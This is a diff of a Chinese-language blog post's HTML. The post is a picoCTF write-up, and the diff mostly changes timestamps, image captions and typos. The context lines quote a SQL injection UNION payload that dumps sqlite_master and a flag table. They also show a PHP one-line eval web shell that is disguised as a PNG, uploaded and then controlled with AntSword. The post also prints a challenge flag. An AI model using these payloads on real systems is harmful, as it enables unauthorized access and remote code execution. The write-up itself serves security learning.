@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://hackmd.io/_uploads/SyahqSYLR.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/HJW1sBtI0.png">
 <meta property="article:published_time" content="2024-06-01T02:27:03.000Z">
-<meta property="article:modified_time" content="2024-06-27T11:37:20.868Z">
+<meta property="article:modified_time" content="2024-06-28T13:18:13.465Z">
 <meta property="article:author" content="CX330">
 <meta property="article:tag" content="CX330, 陳子雋, CX330 universe, CX330 Blog, Blog, CTF, CX330 hacker, hacker">
 <meta name="twitter:card" content="summary">
@@ -773,8 +773,8 @@ mjx-container[display="true"] + br {
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-06-27 19:37:20</span>
-            <span class="mobile">2024-06-27 19:37:20</span>
+            <span class="desktop">2024-06-28 21:18:13</span>
+            <span class="mobile">2024-06-28 21:18:13</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -811,7 +811,7 @@ mjx-container[display="true"] + br {
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.8k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.9k Words</span>
         </span>
     
     
@@ -862,18 +862,18 @@ mjx-container[display="true"] + br {
 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> city, address, phone <span class="keyword">FROM</span> {TABLE_NAME} <span class="keyword">WHERE</span> city <span class="operator">=</span> <span class="string">''</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> name, <span class="keyword">sql</span>, <span class="number">1337</span> <span class="keyword">FROM</span> sqlite_master; <span class="comment">--';</span></span><br></pre></td></tr></table></figure></div>
 
 <p>這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是 sqlite_master 的表格內容，如下:</p>
-<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BysgmNY8R.png" alt="image"><figcaption>image</figcaption></figure></p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BysgmNY8R.png" alt="找到flag所在的表格了"><figcaption>找到flag所在的表格了</figcaption></figure></p>
 <p>我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload<code>' UNION SELECT 1, flag, 1 FROM more_table; --</code>。輸入後就可以看到以下的介面啦！</p>
-<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyoSNNtLA.png" alt="image"><figcaption>image</figcaption></figure></p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyoSNNtLA.png" alt="flag"><figcaption>flag</figcaption></figure></p>
 <p>flag 就找到囉！</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="Trickster"><a href="#Trickster" class="headerlink" title="Trickster"></a>Trickster</h2><p>這題的題目是一個可以上傳 png 的網頁，看起來就是文件上船漏洞，頁面如下:</p>
+<h2 id="Trickster"><a href="#Trickster" class="headerlink" title="Trickster"></a>Trickster</h2><p>這題的題目是一個可以上傳 png 的網頁，看起來就是文件上傳漏洞，頁面如下:</p>
 <p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HkocKNtIA.png" alt="題目"><figcaption>題目</figcaption></figure></p>
 <p><del>秉持著不知道要幹嘛的時候先掃路徑的精神</del>，可以找到它的 robots.txt，它其中禁止了兩個路徑，如下:</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /instructions.txt</span><br><span class="line">Disallow: /uploads/</span><br></pre></td></tr></table></figure></div>
 
-<p>既然它都禁止了，我們就去看看吧 XD。<code>/uploads/</code>應該就是它的上船後的文件路徑了，而它 instructions.txt 的內容如下:</p>
+<p>既然它都禁止了，我們就去看看吧 XD。<code>/uploads/</code>應該就是它的上傳後的文件路徑了，而它 instructions.txt 的內容如下:</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Let's create a web app for PNG Images processing.</span><br><span class="line">It needs to:</span><br><span class="line">Allow users to upload PNG images</span><br><span class="line">	look for ".png" extension in the submitted files</span><br><span class="line">	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )</span><br><span class="line">after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.</span><br></pre></td></tr></table></figure></div>
 
 <p>所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為<code>.png</code>；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為<code>50 4E 47</code>。</p>
@@ -881,7 +881,7 @@ mjx-container[display="true"] + br {
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'shell'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>整個修改完後如下（點開來看可能會比較清楚）:</p>
-<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Sy7rFrYU0.png" alt="image"><figcaption>image</figcaption></figure></p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Sy7rFrYU0.png" alt="一句話木馬"><figcaption>一句話木馬</figcaption></figure></p>
 <p>上傳完成後，現在這個 shell 就會位於<code>https://my_instance_url/uploads/hack.png.php</code>這個位置上啦。</p>
 <p>接下來再用<a class="link" target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">中國蟻劍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>這款工具去連接那個 web shell 就可以啦，連接過程如下:</p>
 <p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJo4cSF8A.png" alt="輸入連接資訊"><figcaption>輸入連接資訊</figcaption></figure></p>
@@ -987,7 +987,7 @@ mjx-container[display="true"] + br {
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-06-27 19:37:20
+                    :</strong> 2024-06-28 21:18:13
             </li>
         
         <li>
